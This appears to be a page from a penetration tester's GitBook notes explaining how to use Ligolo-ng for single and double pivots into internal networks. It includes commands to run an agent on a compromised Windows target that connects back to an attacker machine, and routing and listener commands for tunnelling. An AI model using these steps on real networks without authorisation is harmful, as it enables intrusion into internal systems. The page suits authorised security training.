# Ligolo-ng

![](.gitbook/assets/image)

[Download](https://github.com/nicocha30/ligolo-ng/releases) respective agent and proxy file depending on the OS. Install agent on the target and proxy on attacking machine.

[**Direct link to heading**](ligolo-ng.md#on-attacking-machine) **On Attacking Machine**

Shoot up ligolo-ng interface on attacking machine

Copy

```
ip tuntap add user root mode tun ligolo
ip link set ligolo up
ifconfig # Verify new interface
```

Proceed to "On Target Machine" after this

Copy

```
tar -xvzf ligolo-ng_proxy_0.5.1_linux_amd64.tar.gz # Unzip proxy file
./proxy -selfcert # Start ligolo-ng (Listens on port 11601 by default)
```

Proceed to "Single Pivot" after this

Copy

```
ligolo-ng >> session # Pick the created session 1
ligolo-ng >> ifconfig # Discloses an internal network B
```

Proceed to "Double Pivot" after this

Copy

```
ligolo-ng >> start # Start the tunnel to Network B (You can ping Windows 10 now)
```

Proceed to code block below this

Copy

```
ligolo-ng >> session # Pick the created session 2
ligolo-ng >> ifconfig # Discloses an internal network C
```

Proceed to code block below this

Copy

```
ip route add 192.168.159.0/24 dev ligolo # Add the internal IP to the IP route
ip route list # Verify the route
```

Copy

```
ligolo-ng >> listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444
ligolo-ng >> start # Start the tunnel to Network C
```

[**Direct link to heading**](ligolo-ng.md#on-target-machine-windows-server-2019) **On Target Machine (Windows Server 2019)**

Proceed to third code block in "On Attacking Machine" after this

Copy

```
./agent.exe -connect 192.168.1.5:11601 -ignore-cert # Establish ligolo-ng session 1
```

#### [Direct link to heading](ligolo-ng.md#single-pivot) Single Pivot

![](<.gitbook/assets/image (1)>)

Proceed to forth code block in "On Attacking Machine" after this

Copy

```
ip route add 192.168.148.0/24 dev ligolo # Add the internal IP to the IP route
ip route list # Verify the route
```

#### [Direct link to heading](ligolo-ng.md#double-pivot) Double Pivot

![](<.gitbook/assets/image (2)>)

Proceed to fifth code block in "On Attacking Machine" after this

Copy

```
agent.exe -connect 192.168.1.5:11601 -ignore-cert # Establishing ligolo-ng session 2
```

> Credits: [hackingarticles.in](https://www.hackingarticles.in/a-detailed-guide-on-ligolo-ng/)

[PreviousPivoting & Forwarding](pivoting-and-forwarding.md) [NextWeb Applications](security/offensive-security/web-applications/)

Last updated 8 days ago
